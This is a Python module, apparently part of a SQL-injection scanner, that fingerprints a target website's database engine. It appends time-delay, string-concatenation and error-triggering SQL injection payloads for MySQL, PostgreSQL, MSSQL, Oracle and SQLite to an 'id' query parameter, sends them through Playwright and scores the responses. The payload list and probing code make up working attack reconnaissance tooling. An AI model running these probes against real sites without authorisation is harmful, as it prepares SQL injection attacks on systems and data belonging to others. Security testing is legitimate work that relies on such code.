# -*- coding: utf-8 -*-
"""
Smart Database Fingerprinting Engine.

This module identifies the backend database technology by observing its
behavioral responses to various probes, rather than just relying on error messages.
"""
import asyncio
import time
from playwright.async_api import BrowserContext, Error, Page
import re
from collections import defaultdict

# Behavioral probes for different database systems
# 'type' can be 'time', 'content', or 'error'
# 'validator' for 'content' is the expected string in the response
BEHAVIORAL_PROBES = [
    # Time-based detection
    {"db": "MySQL", "type": "time", "payload": "AND SLEEP(3)", "validator": 3},
    {"db": "PostgreSQL", "type": "time", "payload": "AND pg_sleep(3)", "validator": 3},
    {"db": "MSSQL", "type": "time", "payload": "AND WAITFOR DELAY '0:0:3'", "validator": 3},
    # Content-based detection (function calls, concatenation)
    {"db": "MySQL", "type": "content", "payload": "AND 1=CONCAT('sqli','hunter')", "validator": "sqlihunter"},
    {"db": "PostgreSQL", "type": "content", "payload": "AND 1=CAST('sqli' || 'hunter' AS text)", "validator": "sqlihunter"},
    {"db": "MSSQL", "type": "content", "payload": "AND 1='sqli'+'hunter'", "validator": "sqlihunter"},
    {"db": "Oracle", "type": "content", "payload": "AND 1=CONCAT('sqli','hunter')", "validator": "sqlihunter"},
    {"db": "Oracle", "type": "content", "payload": "AND 1=('sqli'||'hunter')", "validator": "sqlihunter"},
    # SQLite Probes
    {"db": "SQLite", "type": "content", "payload": "AND 1=SUBSTR(SQLITE_VERSION(),1,1)", "validator": "3"}, # SQLite versions are 3.x
    {"db": "SQLite", "type": "time", "payload": "AND (SELECT COUNT(*) FROM (SELECT 1 UNION ALL SELECT 2) a, (SELECT 1 UNION ALL SELECT 2) b, (SELECT 1 UNION ALL SELECT 2) c, (SELECT 1 UNION ALL SELECT 2) d, (SELECT 1 UNION ALL SELECT 2) e, (SELECT 1 UNION ALL SELECT 2) f) > 0", "validator": 0.5}, # Cartesian product to cause delay
    {"db": "SQLite", "type": "error", "payload": "'", "validator": "unrecognized token"},

    # Error-based detection (as a fallback)
    {"db": "MySQL", "type": "error", "payload": "'", "validator": "you have an error in your sql syntax"},
    {"db": "PostgreSQL", "type": "error", "payload": "'", "validator": "syntax error at or near"},
    {"db": "MSSQL", "type": "error", "payload": "'", "validator": "unclosed quotation mark"},
    {"db": "Oracle", "type": "error", "payload": "'", "validator": "ora-00933"},
]

class DbFingerprinter:
    """
    Detects the backend database of a target URL by analyzing behavioral clues
    and error messages, generating a probability distribution for the likeliest engine.
    """
    def __init__(self, browser_context: BrowserContext):
        self.context = browser_context
        self.db_scores = defaultdict(int)

    async def _test_probe(self, page: Page, base_url: str, probe: dict) -> bool:
        """Tests a single behavioral probe against the target."""
        # For now, we assume a numeric parameter 'id'. This could be made more flexible.
        # CRITICAL FIX: Added a URL-encoded space (%20) before the payload.
        test_url = f"{base_url.rstrip('/')}/?id=1%20{probe['payload']}"

        try:
            start_time = time.time()
            response = await page.goto(test_url, wait_until="domcontentloaded", timeout=10000)
            end_time = time.time()

            if not response:
                return False

            if probe['type'] == 'time':
                duration = end_time - start_time
                # Check if duration is within 70% of the expected delay, allowing for network latency.
                return duration > probe['validator'] * 0.7

            body = await response.text()

            if probe['type'] == 'content':
                # A simple check. More advanced checks could use regex or structural analysis.
                return probe['validator'] in body

            if probe['type'] == 'error':
                return re.search(probe['validator'], body, re.IGNORECASE) is not None

        except Error as e:
            # A crashed connection is a strong signal for error-based probes.
            if "net::ERR_ABORTED" in str(e) and probe['type'] == 'error':
                print(f"  [+] Hit for {probe['db']} (Type: error, via connection abort)")
                return True

            print(f"  [DEBUG] Playwright error in fingerprinter for probe '{probe['payload']}': {e}")
            return False

        return False

    async def detect_db(self, base_url: str) -> str | None:
        """
        Sends behavioral probes to the target and analyzes the responses to
        determine the most likely database engine.

        :param base_url: The base URL of the target application.
        :return: The name of the most likely database, or None if no database is identified.
        """
        print("[*] Starting smart database fingerprinting...")
        page = await self.context.new_page()
        self.db_scores = defaultdict(int)

        try:
            # Run probes sequentially to avoid Playwright page interference
            for probe in BEHAVIORAL_PROBES:
                was_successful = await self._test_probe(page, base_url, probe)
                if was_successful:
                    self.db_scores[probe['db']] += 1
                    # No need for the full payload in the hit message for cleaner logs
                    print(f"  [+] Hit for {probe['db']} (Type: {probe['type']})")
        finally:
            await page.close()

        if not self.db_scores:
            print("[-] Smart fingerprinting did not identify a database.")
            return None

        # Find the database with the highest score
        most_likely_db = max(self.db_scores, key=self.db_scores.get)

        print(f"[*] Fingerprinting finished. Scores: {dict(self.db_scores)}")
        print(f"[+] Most likely database detected: {most_likely_db}")
        return most_likely_db
